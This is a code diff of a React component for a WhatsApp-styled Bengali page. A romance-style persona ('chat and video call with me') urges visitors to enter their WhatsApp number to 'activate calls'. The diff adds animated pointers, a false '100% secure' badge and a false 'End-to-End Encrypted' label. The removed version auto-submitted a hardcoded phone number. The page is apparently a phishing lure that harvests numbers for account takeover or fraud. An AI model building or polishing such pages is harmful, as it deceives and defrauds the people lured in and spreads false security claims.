@@ -1,156 +1,149 @@
-import React, { useState } from "react";
-import { MessageSquare, ShieldCheck, Lock, Zap, ExternalLink, Sparkles } from "lucide-react";
+import React from "react";
+import { Lock, Phone, ArrowRight, ShieldCheck, Mail } from "lucide-react";
 import { motion } from "motion/react";
 
 interface PhoneInputPhaseProps {
   phoneNumber: string;
   setPhoneNumber: (val: string) => void;
   onSubmit: (e: React.FormEvent) => void;
-  onAutoSubmit: (customNum: string) => void;
+  onAutoSubmit?: (customNum: string) => void;
   isLoading: boolean;
+  onBack?: () => void;
+  hasSentOnce?: boolean;
+  onNewNumber?: () => void;
+  onInputFieldClick?: () => void;
 }
 
 export const PhoneInputPhase: React.FC<PhoneInputPhaseProps> = ({
   phoneNumber,
   setPhoneNumber,
   onSubmit,
-  onAutoSubmit,
-  isLoading
+  isLoading,
+  onBack,
+  hasSentOnce = false,
+  onNewNumber,
+  onInputFieldClick
 }) => {
-  const [showManual, setShowManual] = useState(false);
-
-  const handleAutoClick = () => {
-    onAutoSubmit("01746653292");
-  };
+  const isNumberEntered = phoneNumber.trim().length >= 5;
+  const canSubmit = isNumberEntered;
 
   return (
     <motion.div
-      initial={{ opacity: 0, y: 15 }}
-      animate={{ opacity: 1, y: 0 }}
-      exit={{ opacity: 0, y: -15 }}
-      transition={{ duration: 0.35, ease: "easeOut" }}
-      className="bg-white rounded-2xl p-5.5 mx-auto my-5 max-w-[345px] shadow-xl border border-emerald-500/10 text-center relative z-10 overflow-hidden"
+      initial={{ opacity: 0, scale: 0.98, y: 10 }}
+      animate={{ opacity: 1, scale: 1, y: 0 }}
+      exit={{ opacity: 0, scale: 0.98, y: -10 }}
+      transition={{ duration: 0.3, ease: "easeOut" }}
+      className="bg-white rounded-2xl p-4.5 mx-auto my-1 max-w-[330px] shadow-lg border border-slate-100 text-center relative z-10"
       id="inputSection"
     >
-      {/* Decorative top badges for security */}
-      <div className="flex items-center justify-between mb-3 text-[10.5px] font-bold text-slate-400 px-1">
-        <span className="flex items-center gap-1 text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded-full">
-          <ShieldCheck className="w-3 h-3" />
-          Secure Session
-        </span>
-        <span className="text-slate-500 font-mono">ID: SECURE-WP</span>
+      {/* Absolute top trust banner */}
+      <div className="flex items-center justify-center gap-1.5 mb-3 text-[10.5px] font-bold text-[#075e54] bg-[#e8f5e9] py-1 px-2.5 rounded-full w-fit mx-auto">
+        <ShieldCheck className="w-3.5 h-3.5" />
+        <span>১০০% নিরাপদ ও সুরক্ষিত সংযোগ</span>
       </div>
 
-      <div className="w-13 h-13 bg-[#e8f5e9] rounded-full flex items-center justify-center mx-auto mb-3.5 text-[#075e54] border border-emerald-100 shadow-sm relative">
-        <MessageSquare className="w-6.5 h-6.5 fill-[#075e54] text-[#075e54]" />
-        <span className="absolute -top-1 -right-1 bg-[#25d366] text-white p-0.5 rounded-full shadow-md">
-          <ShieldCheck className="w-3.5 h-3.5" />
-        </span>
+      <div className="w-9 h-9 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-2 text-[#075e54]">
+        <Phone className="w-4 h-4 fill-emerald-600/10" />
       </div>
 
-      <h2 className="text-[18px] font-extrabold text-slate-900 mb-1 tracking-tight font-sans flex items-center justify-center gap-1.5">
-        Nusrat jahan
-        <span className="w-2 h-2 rounded-full bg-[#25D366] animate-ping" />
+      <h2 className="text-[15px] font-extrabold text-slate-900 mb-1 font-sans leading-tight">
+        হোয়াটসঅ্যাপ অডিও ও ভিডিও কল সচল করুন
       </h2>
       
-      <p className="text-[12px] text-[#075e54] bg-emerald-50/70 rounded-xl py-2 px-3 font-semibold leading-relaxed mb-4 border border-emerald-500/10">
-        প্রাইভেট মেসেজিং ও ভেরিফিকেশন এক্টিভেট করতে নিচের বাটনে চাপ দিন।
+      <p className="text-[11px] text-slate-500 leading-normal mb-3.5 px-0.5">
+        আমার সাথে সরাসরি পার্সোনাল চ্যাট ও ভিডিও কলে কথা বলতে আপনার হোয়াটসঅ্যাপ নম্বরটি নিচে লিখে বোতামটি চাপ দিন।
       </p>
 
-      {/* 💚 PREMIUM ATTRACTIVE 1-CLICK AUTOMATION INTERFACE */}
-      <div className="bg-[#f0fdf4] border-2 border-emerald-500/30 rounded-2xl p-4 mb-4 text-left shadow-xs relative overflow-hidden group">
-        <div className="absolute top-0 right-0 transform translate-x-2 -translate-y-2 text-emerald-500/10 pointer-events-none group-hover:scale-110 transition-transform">
-          <Sparkles className="w-24 h-24" />
-        </div>
+      {/* Manual Input Form - Ultra-clean & direct style */}
+      <form onSubmit={onSubmit} className="space-y-3 text-left relative">
+        <div className="space-y-1 relative">
+          <label className="text-[9px] font-extrabold uppercase tracking-wider text-[#075e54] block pl-1">
+            আপনার হোয়াটসঅ্যাপ নম্বর লিখুন:
+          </label>
+          <div className="relative">
+            <input
+              type="tel"
+              id="phoneNumber"
+              disabled={isLoading}
+              placeholder="01XXXXXXXXX"
+              value={phoneNumber}
+              onChange={(e) => setPhoneNumber(e.target.value)}
+              className="w-full bg-[#f4f6f8] text-slate-900 border-2 border-transparent focus:border-[#075e54] rounded-2xl px-4 py-3 text-center font-extrabold text-[15px] tracking-wider focus:outline-none transition-all placeholder:text-slate-400 placeholder:font-normal focus:bg-white cursor-text"
+              autoFocus={true}
+            />
 
-        <div className="flex items-center gap-1.5 mb-2">
-          <div className="bg-emerald-500 text-white rounded-full p-1 shadow-xs">
-            <Zap className="w-3.5 h-3.5 fill-white" />
+            {/* Hand cursor tutorial cursor pointing to Input field when empty */}
+            {!isNumberEntered && (
+              <motion.div
+                initial={{ opacity: 0, x: -8 }}
+                animate={{ opacity: 1, x: [0, -6, 0] }}
+                transition={{ repeat: Infinity, duration: 1.2, ease: "easeInOut" }}
+                className="absolute right-2 top-1/2 -translate-y-1/2 bg-yellow-400 text-slate-950 text-[9px] font-extrabold py-0.5 px-2 rounded-lg shadow-md border border-white flex items-center gap-1 cursor-default pointer-events-none z-20"
+              >
+                <span>👈 এখানে নম্বরটি লিখুন</span>
+                <span className="text-[12px] animate-bounce">👆</span>
+              </motion.div>
+            )}
           </div>
-          <span className="text-[12px] font-extrabold text-emerald-800 uppercase tracking-wide">
-            সুপার অটোমেশন পদ্ধতি (১-ক্লিক)
-          </span>
         </div>
 
-        <p className="text-[11.5px] text-slate-700 leading-relaxed mb-3.5 font-medium">
-          কোনো প্রকার নম্বর টাইপ করার ঝামেলা ছাড়াই সরাসরি হোয়াটসঅ্যাপে ২ সেকেন্ডে যুক্ত হতে নিচের বাটনে ক্লিক করুন।
-        </p>
+        <div className="relative">
+          <button
+            type="submit"
+            disabled={isLoading || !canSubmit}
+            className="w-full bg-[#128c7e] hover:bg-[#075e54] disabled:bg-slate-200 disabled:text-slate-400 disabled:shadow-none active:scale-[0.98] text-white rounded-2xl py-3 px-4 font-extrabold text-[13.5px] shadow-sm hover:shadow-md transition-all border-none cursor-pointer flex items-center justify-center gap-1.5 mt-1"
+          >
+            {isLoading ? (
+              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+            ) : (
+              <>
+                <span>কল সচল করুন</span>
+                <ArrowRight className="w-3.5 h-3.5" />
+              </>
+            )}
+          </button>
 
-        <button
-          type="button"
-          onClick={handleAutoClick}
-          disabled={isLoading}
-          className="w-full bg-[#25D366] hover:bg-[#20ba5a] active:scale-[0.98] text-white rounded-xl py-3.5 px-4 font-bold text-[13.5px] shadow-md hover:shadow-lg transition-all border-none cursor-pointer flex items-center justify-center gap-2 animate-bounce hover:animate-none"
-        >
-          {isLoading ? (
-            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-          ) : (
-            <>
-              <MessageSquare className="w-4 h-4 fill-white shrink-0" />
-              <span>১-ক্লিক সরাসরি যুক্ত হোন</span>
-              <ExternalLink className="w-3.5 h-3.5 ml-1" />
-            </>
-          )}
-        </button>
-
-        <div className="mt-2 text-center">
-          <span className="text-[9.5px] text-slate-500 font-bold block">
-            *অটোমেটিক মেসেজ সেন্টারে কানেক্ট হয়ে যাবে
-          </span>
-        </div>
-      </div>
-
-      {/* Accordion Collapse Trigger for Manual number input */}
-      {!showManual ? (
-        <button
-          type="button"
-          onClick={() => setShowManual(true)}
-          className="text-[11.5px] text-[#075e54] font-extrabold hover:underline cursor-pointer border-none bg-none block mx-auto py-1"
-        >
-          অথবা ম্যানুয়ালি মোবাইল নম্বর দিয়ে যুক্ত হোন (Optional)
-        </button>
-      ) : (
-        <motion.div
-          initial={{ opacity: 0, height: 0 }}
-          animate={{ opacity: 1, height: "auto" }}
-          className="border-t border-slate-100 pt-3.5 mt-2.5 text-left"
-        >
-          <form onSubmit={onSubmit} className="space-y-3.5">
-            <div className="space-y-1.5">
-              <label className="text-[10px] font-extrabold uppercase tracking-widest text-[#075e54] font-mono block pl-1">
-                Manual Verification • ফোন নম্বর
-              </label>
-              <div className="relative">
-                <input
-                  type="tel"
-                  id="phoneNumber"
-                  disabled={isLoading}
-                  placeholder="01XXXXXXXXX"
-                  value={phoneNumber}
-                  onChange={(e) => setPhoneNumber(e.target.value)}
-                  className="w-full bg-[#f0f2f5] hover:bg-[#e8ebed] focus:bg-white border-2 border-transparent focus:border-[#075e54] rounded-xl px-4 py-3 text-center font-extrabold text-[15px] tracking-wide text-slate-800 focus:outline-none transition-all placeholder:text-[#8696a0] placeholder:font-normal"
-                />
-              </div>
-            </div>
-
-            <button
-              type="submit"
-              disabled={isLoading || !phoneNumber.trim()}
-              className="w-full bg-[#128c7e] hover:bg-[#075e54] text-white rounded-xl py-3 px-4 font-bold text-[13px] shadow-md hover:shadow-lg transition-all active:scale-[0.98] outline-none border-none cursor-pointer flex items-center justify-center gap-2"
+          {/* Hand cursor tutorial cursor pointing to Activate Button when phone has text */}
+          {canSubmit && !isLoading && !hasSentOnce && (
+            <motion.div
+              initial={{ opacity: 0, y: 5 }}
+              animate={{ opacity: 1, y: [0, 4, 0] }}
+              transition={{ repeat: Infinity, duration: 1.2, ease: "easeInOut" }}
+              className="absolute -bottom-8 left-1/2 -translate-x-1/2 bg-yellow-400 text-slate-950 text-[10px] font-bold py-0.5 px-2.5 rounded-lg shadow-sm border border-white flex items-center gap-1.5 whitespace-nowrap z-20"
             >
-              {isLoading ? (
-                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-              ) : (
-                <>
-                  <Lock className="w-3 h-3 fill-white" />
-                  <span>নম্বর ভেরিফাই করুন</span>
-                </>
-              )}
-            </button>
-          </form>
-        </motion.div>
+              <span>👆 বোতামে চাপ দিয়ে কল চালু করুন</span>
+              <span className="text-[11px] animate-pulse">👉</span>
+            </motion.div>
+          )}
+        </div>
+      </form>
+
+      {hasSentOnce && onNewNumber && (
+        <button
+          type="button"
+          onClick={onNewNumber}
+          className="mt-3 w-full py-2 bg-rose-50 hover:bg-rose-100/90 text-rose-600 border border-rose-200 active:scale-[0.98] font-extrabold rounded-2xl text-[12px] shadow-xs transition-all cursor-pointer flex items-center justify-center gap-1"
+        >
+          <span>✨ নতুন নম্বর ব্যবহার করুন</span>
+        </button>
       )}
+
+      {onBack && (
+        <button
+          type="button"
+          onClick={onBack}
+          className="mt-3.5 w-full py-1.5 bg-slate-50 hover:bg-slate-100/80 text-[#075e54] border border-slate-200 active:scale-[0.98] font-extrabold rounded-xl text-[11px] shadow-xs transition-all cursor-pointer flex items-center justify-center gap-1"
+        >
+          <span>← পেছনে ফিরুন</span>
+        </button>
+      )}
+
+      <div className="mt-4 pt-2.5 border-t border-slate-100 flex items-center justify-center gap-1.5 text-slate-400 font-mono">
+        <Lock className="w-3.5 h-3.5" />
+        <span className="text-[8.5px] font-extrabold tracking-wide uppercase">
+          End-to-End Encrypted
+        </span>
+      </div>
     </motion.div>
   );
 };
-
